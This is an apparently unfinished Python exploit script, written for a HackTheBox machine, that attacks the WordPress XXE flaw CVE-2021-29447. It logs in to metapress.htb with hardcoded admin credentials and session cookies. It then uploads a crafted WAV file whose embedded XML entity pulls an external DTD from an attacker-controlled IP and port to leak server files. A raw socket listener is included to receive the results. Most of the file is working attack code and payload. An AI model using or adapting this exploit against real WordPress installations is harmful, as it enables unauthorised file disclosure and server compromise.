#! /usr/bin/env python3

#### Title: Exploit Get Shell - WordPress
#### Author: 0xEtern4lW0lf
#### Created: 18 Dez 2022
#### Description: TEMPLATE
#### CVE-2021-29447

#### ========= MODULES =========

# hardler
import socket, telnetlib
from threading import Thread

# http lib
import requests, urllib, urllib3
urllib3.disable_warnings()

import argparse
import sys
import base64
import time


#### ========= VARIABLE =========

#### COLORS ####
RED = "\033[1;91m"
YELLOW = "\033[1;93m"
BLUE = "\033[1;94m"
GREEN = "\033[1;92m"
END = "\033[1;m "

## Set proxy [OPTIONAL]
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

#### ========= FUNCTION =========

## Banner
def banner():
  EwLogo = f"""

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⣀⠠⠤⢤⣤⣶⣴⣦⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⡞⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠻⢿⣷⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣄⠈⠉⠛⠿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡯⣿⣷⡄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠰⢾⣿⣿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢌⡻⢿⡆⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠝⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⡌⠿⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⠋⠀⣸⣧⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⡄⠁
⠀⠀⠀⠀⠀⠀⠀⢀⣾⣏⣴⠟⢻⣿⠟⠛⠶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⢻⣿⡀
⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣴⠿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⢳⣜⣿⡇
⠀⠀⠀⠀⠀⣠⣾⣿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⢿⣿⡇
⠀⠀⢀⣤⣾⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠸⣿⠇
⢀⣴⣿⡿⠋⠀⠀⠀⠀⠀⣀⣤⣶⣶⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⢸⣿⡄⡿⠀
⢺⣿⡏⠀⠀⠀⠀⢀⣤⣾⣿⠿⠛⠋⠙⠻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡝⣦⠀⣸⣿⡧⠃⠀
⠀⠈⠉⠀⢠⣤⣶⣿⡿⠋⠀⠀⠀⠀⠀⡀⠈⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⣿⣷⣿⣿⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⢀⡜⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡆⠀⠀⣼⡇⣾⣿⣿⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⢻⣿⣀⣾⣿⢡⣿⡿⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⡿⢣⣿⣿⣿⣿⣣⡿⠋⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⡿⠀⠀⠀⠀⠀⣀⣠⣤⣴⣶⣿⠿⣋⣴⣿⣿⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⡇⠀⢀⣠⣶⣿⣿⡿⠟⠋⠉⠐⠊⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣇⣴⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀{RED}#--------------------------------------------#
 _____  _                         ___  _  _    _  _____  _   __ 
|  ___|| |                       /   || || |  | ||  _  || | / _|
| |__  | |_   ___  _ __  _ __   / /| || || |  | || |/' || || |_ 
|  __| | __| / _ \| '__|| '_ \ / /_| || || |/\| ||  /| || ||  _|
| |___ | |_ |  __/| |   | | | |\___  || |\  /\  /\ |_/ /| || |  
\____/  \__| \___||_|   |_| |_|    |_/|_| \/  \/  \___/ |_||_|  
                                                                
#----------------------------------------------------------------# 
    
    Author: {GREEN}0xEtern4lW0lf{END}                           
    {RED}Site: {BLUE}https://0xetern4lw0lf.github.io/{END}

    FOR EDUCATIONAL PURPOSE ONLY.

  """
  return print(f'{BLUE}{EwLogo}{END}')

# Pretty loading wheel
def loading(spins):

    def spinning_cursor():
        while True:
            for cursor in '|/ -\\':
                yield cursor

    spinner = spinning_cursor()
    for _ in range(spins):
        sys.stdout.write(next(spinner))
        sys.stdout.flush()
        time.sleep(0.1)
        sys.stdout.write('\b')


## Weaponization and Attack

def listenPythonServer():
    HOST = '0.0.0.0'     # Endereco IP do Servidor
    PORT = 9090            # Porta que o Servidor esta
    tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    orig = (HOST, PORT)
    tcp.bind(orig)
    tcp.listen(1)
    while True:
        con, cliente = tcp.accept()
        print('Conectado por', cliente)
        while True:
            msg = con.recv(1024)
            if not msg: break
            print(cliente, msg)
        print('Finalizando conexao do cliente', cliente)
        con.close()


# Session HTTP
r = requests.session()

'''Requests HTTP here'''

def loginAdmin():
    print(f"\n{BLUE}[+] LOGIN: {YELLOW}Let's login as admin! {BLUE}[+]{END}")
    url = f"http://metapress.htb/wp-login.php"

    
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': 'PHPSESSID=00q23nafsv83lncbkf9c70il1t; wordpress_test_cookie=WP%20Cookie%20check',
        'Content-Length': '136'
        }


    data = {'log':'manager', 'pwd':'partylikearockstar', 'rememberme':'forever', 'wp-submit':'Log+In', 'redirect_to':'http://metapress.htb/wp-admin/', 'testcookie':'1'}
    
    r.post(url, headers=headers, data=data, verify=False)

    #allow_redirects=True

    url = f"http://metapress.htb/wp-admin/profile.php"

    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Connection': 'close', 
    'Referer': 'http://metapress.htb/wp-login.php'
    }

#    'Cookie': 'PHPSESSID=00q23nafsv83lncbkf9c70il1t; wordpress_test_cookie=WP%20Cookie%20check', 
    

    r.get(url, headers=headers, cookies=r.cookies, data=data, verify=False)


    loading(8)
    print(f"{BLUE}[+] LOGIN: {YELLOW}Logged {GREEN}SUCCESSFULLY! {BLUE}[+]{END}")

def sendPayload():

    url = f"http://metapress.htb/wp-admin/async-upload.php"

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept-Encoding': 'gzip, deflate',
        'Referer': 'http://metapress.htb/wp-admin/upload.php',
        'Content-Type': 'multipart/form-data; boundary=---------------------------174185978927769959843803489761',
        'Connection': 'close',
        'Cookie': 'wordpress_498b28797b9ccef61e19f54e27d9e6f4=manager%7C1673627630%7CWRFzYNT5KG25CR74watFADO8H0yHP4jucvsv30e6RXJ%7C2b2aafa0115b38bfd11857f8c86bcb23c720aea5d1787e89ad59efd79ee52b3a; PHPSESSID=00q23nafsv83lncbkf9c70il1t; wordpress_test_cookie=WP%20Cookie%20check; wp-settings-time-2=1672371066; wp-settings-2=uploader%3D1%26mfold%3Df; wordpress_logged_in_498b28797b9ccef61e19f54e27d9e6f4=manager%7C1673627630%7CWRFzYNT5KG25CR74watFADO8H0yHP4jucvsv30e6RXJ%7C5d3ab6f57e48d4d88afba560350a61030cb812abdb0562d7f8833d33f033cc2a'
}


    data = '''-----------------------------174185978927769959843803489761
Content-Disposition: form-data; name="name"

payload.wav
-----------------------------174185978927769959843803489761
Content-Disposition: form-data; name="action"

upload-attachment
-----------------------------174185978927769959843803489761
Content-Disposition: form-data; name="_wpnonce"

2be5fb72ae
-----------------------------174185978927769959843803489761
Content-Disposition: form-data; name="async-upload"; filename="payload.wav"
Content-Type: audio/x-wav

RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM 'http://10.10.14.7:9090/etern4lw0lf.dtd'>%remote;%init;%trick;]>\x00
-----------------------------174185978927769959843803489761--'''


    r.post(url, headers=headers, data=data, verify=False, proxies=proxies)

def sendPayload2():

    files = {
        "name": 'payload.wav', 
        'action': 'upload-attachment', 
        '_wpnonce': '2be5fb72ae', 
        'async-upload': (
            'payload.wav',
            '''RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.7:9090/etern4lw0lf.dtd'"'"'>%remote;%init;%trick;]>\x00''', 
            'audio/x-wav'       
            )

    }

    url = f"http://metapress.htb/wp-admin/async-upload.php"

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Cookie': 'wordpress_498b28797b9ccef61e19f54e27d9e6f4=manager%7C1673627630%7CWRFzYNT5KG25CR74watFADO8H0yHP4jucvsv30e6RXJ%7C2b2aafa0115b38bfd11857f8c86bcb23c720aea5d1787e89ad59efd79ee52b3a; PHPSESSID=00q23nafsv83lncbkf9c70il1t; wordpress_test_cookie=WP%20Cookie%20check; wp-settings-time-2=1672371066; wp-settings-2=uploader%3D1%26mfold%3Df; wordpress_logged_in_498b28797b9ccef61e19f54e27d9e6f4=manager%7C1673627630%7CWRFzYNT5KG25CR74watFADO8H0yHP4jucvsv30e6RXJ%7C5d3ab6f57e48d4d88afba560350a61030cb812abdb0562d7f8833d33f033cc2a',
        'Accept-Encoding': 'gzip, deflate',
        'Referer': 'http://metapress.htb/wp-admin/upload.php',
        'Content-Length': '751',
        'Connection': 'close'
        }
#        'Content-Type': 'multipart/form-data; boundary=---------------------------294553548838541967261519270135',
        


    response = r.post(url, headers=headers, files=files, verify=False, proxies=proxies, )
    print(response.text)







def main():
    # Parse Arguments
    parser = argparse.ArgumentParser(description='HackTheBox TEMPLATE AutoShell - 0xEtern4lW0lf')
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-li', '--localip', help='Local ip address or hostname', required=True)
    parser.add_argument('-lp', '--localport', help='Local port to receive the shell', required=True)

    args = parser.parse_args()

    rhost = args.target
    lhost = args.localip
    lport = args.localport
    

    loginAdmin()

    sendPayload()

#### EXECUTION

if __name__ == '__main__':
    main()